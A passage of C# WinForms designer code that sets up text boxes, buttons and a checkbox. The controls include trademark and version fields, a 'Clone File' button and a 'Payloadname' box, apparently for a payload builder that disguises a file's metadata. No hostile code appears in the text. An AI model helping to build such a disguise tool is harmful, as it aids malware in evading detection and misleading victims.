        this.BuilderTrademarksAssembly.PlaceholderText = "Trademarks";
        this.BuilderTrademarksAssembly.ReadOnly = false;
        this.BuilderTrademarksAssembly.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderTrademarksAssembly.SelectedText = "";
        this.BuilderTrademarksAssembly.SelectionLength = 0;
        this.BuilderTrademarksAssembly.SelectionStart = 0;
        this.BuilderTrademarksAssembly.ShortcutsEnabled = true;
        this.BuilderTrademarksAssembly.Size = new System.Drawing.Size(149, 28);
        this.BuilderTrademarksAssembly.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderTrademarksAssembly.TabIndex = 638;
        this.BuilderTrademarksAssembly.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderTrademarksAssembly.TextMarginBottom = 0;
        this.BuilderTrademarksAssembly.TextMarginLeft = 3;
        this.BuilderTrademarksAssembly.TextMarginTop = 1;
        this.BuilderTrademarksAssembly.TextPlaceholder = "Trademarks";
        this.BuilderTrademarksAssembly.UseSystemPasswordChar = false;
        this.BuilderTrademarksAssembly.WordWrap = true;
        // 
        // Vr1
        // 
        this.Vr1.AcceptsReturn = false;
        this.Vr1.AcceptsTab = false;
        this.Vr1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.Vr1.AnimationSpeed = 200;
        this.Vr1.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Vr1.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Vr1.AutoSizeHeight = true;
        this.Vr1.BackColor = System.Drawing.Color.Transparent;
        this.Vr1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Vr1.BackgroundImage")));
        this.Vr1.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Vr1.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.Vr1.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.Vr1.BorderColorIdle = System.Drawing.Color.Silver;
        this.Vr1.BorderRadius = 2;
        this.Vr1.BorderThickness = 1;
        this.Vr1.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.Vr1.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Vr1.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr1.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.Vr1.DefaultText = "1";
        this.Vr1.FillColor = System.Drawing.Color.White;
        this.Vr1.HideSelection = true;
        this.Vr1.IconLeft = null;
        this.Vr1.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr1.IconPadding = 10;
        this.Vr1.IconRight = null;
        this.Vr1.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr1.Lines = new string[] {
        "1"};
        this.Vr1.Location = new System.Drawing.Point(6, 112);
        this.Vr1.MaxLength = 32767;
        this.Vr1.MinimumSize = new System.Drawing.Size(1, 1);
        this.Vr1.Modified = false;
        this.Vr1.Multiline = false;
        this.Vr1.Name = "Vr1";
        stateProperties21.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties21.FillColor = System.Drawing.Color.Empty;
        stateProperties21.ForeColor = System.Drawing.Color.Empty;
        stateProperties21.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr1.OnActiveState = stateProperties21;
        stateProperties22.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties22.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties22.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Vr1.OnDisabledState = stateProperties22;
        stateProperties23.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties23.FillColor = System.Drawing.Color.Empty;
        stateProperties23.ForeColor = System.Drawing.Color.Empty;
        stateProperties23.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr1.OnHoverState = stateProperties23;
        stateProperties24.BorderColor = System.Drawing.Color.Silver;
        stateProperties24.FillColor = System.Drawing.Color.White;
        stateProperties24.ForeColor = System.Drawing.Color.Empty;
        stateProperties24.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr1.OnIdleState = stateProperties24;
        this.Vr1.Padding = new System.Windows.Forms.Padding(3);
        this.Vr1.PasswordChar = '\0';
        this.Vr1.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Vr1.PlaceholderText = "0";
        this.Vr1.ReadOnly = false;
        this.Vr1.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Vr1.SelectedText = "";
        this.Vr1.SelectionLength = 0;
        this.Vr1.SelectionStart = 1;
        this.Vr1.ShortcutsEnabled = true;
        this.Vr1.Size = new System.Drawing.Size(38, 28);
        this.Vr1.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Vr1.TabIndex = 639;
        this.Vr1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Vr1.TextMarginBottom = 0;
        this.Vr1.TextMarginLeft = 3;
        this.Vr1.TextMarginTop = 1;
        this.Vr1.TextPlaceholder = "0";
        this.Vr1.UseSystemPasswordChar = false;
        this.Vr1.WordWrap = true;
        this.Vr1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Vr4_KeyDown);
        this.Vr1.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Vr4_KeyPress);
        // 
        // Vr2
        // 
        this.Vr2.AcceptsReturn = false;
        this.Vr2.AcceptsTab = false;
        this.Vr2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.Vr2.AnimationSpeed = 200;
        this.Vr2.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Vr2.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Vr2.AutoSizeHeight = true;
        this.Vr2.BackColor = System.Drawing.Color.Transparent;
        this.Vr2.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Vr2.BackgroundImage")));
        this.Vr2.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Vr2.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.Vr2.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.Vr2.BorderColorIdle = System.Drawing.Color.Silver;
        this.Vr2.BorderRadius = 2;
        this.Vr2.BorderThickness = 1;
        this.Vr2.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.Vr2.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Vr2.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr2.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.Vr2.DefaultText = "1";
        this.Vr2.FillColor = System.Drawing.Color.White;
        this.Vr2.HideSelection = true;
        this.Vr2.IconLeft = null;
        this.Vr2.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr2.IconPadding = 10;
        this.Vr2.IconRight = null;
        this.Vr2.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr2.Lines = new string[] {
        "1"};
        this.Vr2.Location = new System.Drawing.Point(47, 112);
        this.Vr2.MaxLength = 32767;
        this.Vr2.MinimumSize = new System.Drawing.Size(1, 1);
        this.Vr2.Modified = false;
        this.Vr2.Multiline = false;
        this.Vr2.Name = "Vr2";
        stateProperties25.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties25.FillColor = System.Drawing.Color.Empty;
        stateProperties25.ForeColor = System.Drawing.Color.Empty;
        stateProperties25.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr2.OnActiveState = stateProperties25;
        stateProperties26.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties26.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties26.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties26.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Vr2.OnDisabledState = stateProperties26;
        stateProperties27.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties27.FillColor = System.Drawing.Color.Empty;
        stateProperties27.ForeColor = System.Drawing.Color.Empty;
        stateProperties27.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr2.OnHoverState = stateProperties27;
        stateProperties28.BorderColor = System.Drawing.Color.Silver;
        stateProperties28.FillColor = System.Drawing.Color.White;
        stateProperties28.ForeColor = System.Drawing.Color.Empty;
        stateProperties28.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr2.OnIdleState = stateProperties28;
        this.Vr2.Padding = new System.Windows.Forms.Padding(3);
        this.Vr2.PasswordChar = '\0';
        this.Vr2.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Vr2.PlaceholderText = "0";
        this.Vr2.ReadOnly = false;
        this.Vr2.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Vr2.SelectedText = "";
        this.Vr2.SelectionLength = 0;
        this.Vr2.SelectionStart = 1;
        this.Vr2.ShortcutsEnabled = true;
        this.Vr2.Size = new System.Drawing.Size(38, 28);
        this.Vr2.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Vr2.TabIndex = 640;
        this.Vr2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Vr2.TextMarginBottom = 0;
        this.Vr2.TextMarginLeft = 3;
        this.Vr2.TextMarginTop = 1;
        this.Vr2.TextPlaceholder = "0";
        this.Vr2.UseSystemPasswordChar = false;
        this.Vr2.WordWrap = true;
        this.Vr2.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Vr4_KeyDown);
        this.Vr2.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Vr4_KeyPress);
        // 
        // Vr3
        // 
        this.Vr3.AcceptsReturn = false;
        this.Vr3.AcceptsTab = false;
        this.Vr3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.Vr3.AnimationSpeed = 200;
        this.Vr3.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Vr3.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Vr3.AutoSizeHeight = true;
        this.Vr3.BackColor = System.Drawing.Color.Transparent;
        this.Vr3.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Vr3.BackgroundImage")));
        this.Vr3.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Vr3.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.Vr3.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.Vr3.BorderColorIdle = System.Drawing.Color.Silver;
        this.Vr3.BorderRadius = 2;
        this.Vr3.BorderThickness = 1;
        this.Vr3.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.Vr3.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Vr3.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr3.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.Vr3.DefaultText = "1";
        this.Vr3.FillColor = System.Drawing.Color.White;
        this.Vr3.HideSelection = true;
        this.Vr3.IconLeft = null;
        this.Vr3.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr3.IconPadding = 10;
        this.Vr3.IconRight = null;
        this.Vr3.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr3.Lines = new string[] {
        "1"};
        this.Vr3.Location = new System.Drawing.Point(92, 112);
        this.Vr3.MaxLength = 32767;
        this.Vr3.MinimumSize = new System.Drawing.Size(1, 1);
        this.Vr3.Modified = false;
        this.Vr3.Multiline = false;
        this.Vr3.Name = "Vr3";
        stateProperties29.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties29.FillColor = System.Drawing.Color.Empty;
        stateProperties29.ForeColor = System.Drawing.Color.Empty;
        stateProperties29.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr3.OnActiveState = stateProperties29;
        stateProperties30.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties30.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties30.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties30.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Vr3.OnDisabledState = stateProperties30;
        stateProperties31.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties31.FillColor = System.Drawing.Color.Empty;
        stateProperties31.ForeColor = System.Drawing.Color.Empty;
        stateProperties31.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr3.OnHoverState = stateProperties31;
        stateProperties32.BorderColor = System.Drawing.Color.Silver;
        stateProperties32.FillColor = System.Drawing.Color.White;
        stateProperties32.ForeColor = System.Drawing.Color.Empty;
        stateProperties32.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr3.OnIdleState = stateProperties32;
        this.Vr3.Padding = new System.Windows.Forms.Padding(3);
        this.Vr3.PasswordChar = '\0';
        this.Vr3.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Vr3.PlaceholderText = "0";
        this.Vr3.ReadOnly = false;
        this.Vr3.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Vr3.SelectedText = "";
        this.Vr3.SelectionLength = 0;
        this.Vr3.SelectionStart = 1;
        this.Vr3.ShortcutsEnabled = true;
        this.Vr3.Size = new System.Drawing.Size(38, 28);
        this.Vr3.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Vr3.TabIndex = 641;
        this.Vr3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Vr3.TextMarginBottom = 0;
        this.Vr3.TextMarginLeft = 3;
        this.Vr3.TextMarginTop = 1;
        this.Vr3.TextPlaceholder = "0";
        this.Vr3.UseSystemPasswordChar = false;
        this.Vr3.WordWrap = true;
        this.Vr3.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Vr4_KeyDown);
        this.Vr3.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Vr4_KeyPress);
        // 
        // Vr4
        // 
        this.Vr4.AcceptsReturn = false;
        this.Vr4.AcceptsTab = false;
        this.Vr4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.Vr4.AnimationSpeed = 200;
        this.Vr4.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Vr4.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Vr4.AutoSizeHeight = true;
        this.Vr4.BackColor = System.Drawing.Color.Transparent;
        this.Vr4.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Vr4.BackgroundImage")));
        this.Vr4.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Vr4.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.Vr4.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.Vr4.BorderColorIdle = System.Drawing.Color.Silver;
        this.Vr4.BorderRadius = 2;
        this.Vr4.BorderThickness = 1;
        this.Vr4.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.Vr4.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Vr4.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr4.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.Vr4.DefaultText = "2";
        this.Vr4.FillColor = System.Drawing.Color.White;
        this.Vr4.HideSelection = true;
        this.Vr4.IconLeft = null;
        this.Vr4.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr4.IconPadding = 10;
        this.Vr4.IconRight = null;
        this.Vr4.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Vr4.Lines = new string[] {
        "2"};
        this.Vr4.Location = new System.Drawing.Point(136, 112);
        this.Vr4.MaxLength = 32767;
        this.Vr4.MinimumSize = new System.Drawing.Size(1, 1);
        this.Vr4.Modified = false;
        this.Vr4.Multiline = false;
        this.Vr4.Name = "Vr4";
        stateProperties33.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties33.FillColor = System.Drawing.Color.Empty;
        stateProperties33.ForeColor = System.Drawing.Color.Empty;
        stateProperties33.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr4.OnActiveState = stateProperties33;
        stateProperties34.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties34.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties34.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties34.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Vr4.OnDisabledState = stateProperties34;
        stateProperties35.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties35.FillColor = System.Drawing.Color.Empty;
        stateProperties35.ForeColor = System.Drawing.Color.Empty;
        stateProperties35.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr4.OnHoverState = stateProperties35;
        stateProperties36.BorderColor = System.Drawing.Color.Silver;
        stateProperties36.FillColor = System.Drawing.Color.White;
        stateProperties36.ForeColor = System.Drawing.Color.Empty;
        stateProperties36.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Vr4.OnIdleState = stateProperties36;
        this.Vr4.Padding = new System.Windows.Forms.Padding(3);
        this.Vr4.PasswordChar = '\0';
        this.Vr4.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Vr4.PlaceholderText = "0";
        this.Vr4.ReadOnly = false;
        this.Vr4.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Vr4.SelectedText = "";
        this.Vr4.SelectionLength = 0;
        this.Vr4.SelectionStart = 1;
        this.Vr4.ShortcutsEnabled = true;
        this.Vr4.Size = new System.Drawing.Size(38, 28);
        this.Vr4.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Vr4.TabIndex = 642;
        this.Vr4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Vr4.TextMarginBottom = 0;
        this.Vr4.TextMarginLeft = 3;
        this.Vr4.TextMarginTop = 1;
        this.Vr4.TextPlaceholder = "0";
        this.Vr4.UseSystemPasswordChar = false;
        this.Vr4.WordWrap = true;
        this.Vr4.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Vr4_KeyDown);
        this.Vr4.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.Vr4_KeyPress);
        // 
        // guna2GradientButton_2
        // 
        this.guna2GradientButton_2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.guna2GradientButton_2.Animated = true;
        this.guna2GradientButton_2.BorderRadius = 2;
        this.guna2GradientButton_2.CheckedState.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.CustomImages.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.FillColor = System.Drawing.Color.Navy;
        this.guna2GradientButton_2.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.guna2GradientButton_2.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Bold);
        this.guna2GradientButton_2.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.HoverState.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Location = new System.Drawing.Point(188, 112);
        this.guna2GradientButton_2.Name = "guna2GradientButton_2";
        this.guna2GradientButton_2.ShadowDecoration.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Size = new System.Drawing.Size(114, 28);
        this.guna2GradientButton_2.TabIndex = 656;
        this.guna2GradientButton_2.Text = "Clone File";
        // 
        // Payloadname
        // 
        this.Payloadname.AcceptsReturn = false;
        this.Payloadname.AcceptsTab = false;
        this.Payloadname.AnimationSpeed = 200;
        this.Payloadname.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Payloadname.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Payloadname.AutoSizeHeight = true;
        this.Payloadname.BackColor = System.Drawing.Color.Transparent;
        this.Payloadname.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Payloadname.BackgroundImage")));
        this.Payloadname.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Payloadname.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.Payloadname.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.Payloadname.BorderColorIdle = System.Drawing.Color.Silver;
        this.Payloadname.BorderRadius = 2;
        this.Payloadname.BorderThickness = 1;
        this.Payloadname.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.Payloadname.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Payloadname.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Payloadname.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.Payloadname.DefaultText = "";
        this.Payloadname.FillColor = System.Drawing.Color.White;
        this.Payloadname.HideSelection = true;
        this.Payloadname.IconLeft = null;
        this.Payloadname.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Payloadname.IconPadding = 10;
        this.Payloadname.IconRight = null;
        this.Payloadname.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Payloadname.Lines = new string[0];
        this.Payloadname.Location = new System.Drawing.Point(19, 139);
        this.Payloadname.MaxLength = 32767;
        this.Payloadname.MinimumSize = new System.Drawing.Size(1, 1);
        this.Payloadname.Modified = false;
        this.Payloadname.Multiline = false;
        this.Payloadname.Name = "Payloadname";
        stateProperties37.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties37.FillColor = System.Drawing.Color.Empty;
        stateProperties37.ForeColor = System.Drawing.Color.Empty;
        stateProperties37.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Payloadname.OnActiveState = stateProperties37;
        stateProperties38.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties38.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties38.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties38.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Payloadname.OnDisabledState = stateProperties38;
        stateProperties39.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties39.FillColor = System.Drawing.Color.Empty;
        stateProperties39.ForeColor = System.Drawing.Color.Empty;
        stateProperties39.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Payloadname.OnHoverState = stateProperties39;
        stateProperties40.BorderColor = System.Drawing.Color.Silver;
        stateProperties40.FillColor = System.Drawing.Color.White;
        stateProperties40.ForeColor = System.Drawing.Color.Empty;
        stateProperties40.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Payloadname.OnIdleState = stateProperties40;
        this.Payloadname.Padding = new System.Windows.Forms.Padding(3);
        this.Payloadname.PasswordChar = '\0';
        this.Payloadname.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Payloadname.PlaceholderText = "Name";
        this.Payloadname.ReadOnly = false;
        this.Payloadname.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Payloadname.SelectedText = "";
        this.Payloadname.SelectionLength = 0;
        this.Payloadname.SelectionStart = 0;
        this.Payloadname.ShortcutsEnabled = true;
        this.Payloadname.Size = new System.Drawing.Size(296, 28);
        this.Payloadname.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Payloadname.TabIndex = 665;
        this.Payloadname.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Payloadname.TextMarginBottom = 0;
        this.Payloadname.TextMarginLeft = 3;
        this.Payloadname.TextMarginTop = 1;
        this.Payloadname.TextPlaceholder = "Name";
        this.Payloadname.UseSystemPasswordChar = false;
        this.Payloadname.WordWrap = true;
        // 
        // label26
        // 
        this.label26.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label26.AutoSize = true;
        this.label26.BackColor = System.Drawing.Color.Transparent;
        this.label26.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label26.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label26.ForeColor = System.Drawing.Color.Black;
        this.label26.Location = new System.Drawing.Point(43, 516);
        this.label26.Name = "label26";
        this.label26.Size = new System.Drawing.Size(57, 15);
        this.label26.TabIndex = 649;
        this.label26.Text = "Data save";
        // 
        // SaveProperties
        // 
        this.SaveProperties.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.SaveProperties.Animated = true;
        this.SaveProperties.BorderRadius = 6;
        this.SaveProperties.CheckedState.Parent = this.SaveProperties;
        this.SaveProperties.CustomImages.Parent = this.SaveProperties;
        this.SaveProperties.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveProperties.FillColor2 = System.Drawing.Color.Navy;
        this.SaveProperties.Font = new System.Drawing.Font("Segoe UI", 9.75F);
        this.SaveProperties.ForeColor = System.Drawing.Color.White;
        this.SaveProperties.HoverState.Parent = this.SaveProperties;
        this.SaveProperties.Location = new System.Drawing.Point(205, 557);
        this.SaveProperties.Name = "SaveProperties";
        this.SaveProperties.ShadowDecoration.Parent = this.SaveProperties;
        this.SaveProperties.Size = new System.Drawing.Size(114, 29);
        this.SaveProperties.TabIndex = 664;
        this.SaveProperties.Text = "OK";
        this.SaveProperties.Click += new System.EventHandler(this.SaveProperties_Click);
        // 
        // SaveSettings
        // 
        this.SaveSettings.AllowBindingControlAnimation = true;
        this.SaveSettings.AllowBindingControlColorChanges = false;
        this.SaveSettings.AllowBindingControlLocation = true;
        this.SaveSettings.AllowCheckBoxAnimation = true;
        this.SaveSettings.AllowCheckmarkAnimation = true;
        this.SaveSettings.AllowOnHoverStates = true;
        this.SaveSettings.AutoCheck = true;
        this.SaveSettings.BackColor = System.Drawing.Color.Transparent;
        this.SaveSettings.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("SaveSettings.BackgroundImage")));
        this.SaveSettings.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.SaveSettings.BindingControl = this.label26;
        this.SaveSettings.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.SaveSettings.BorderRadius = 6;
        this.SaveSettings.Checked = false;
        this.SaveSettings.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
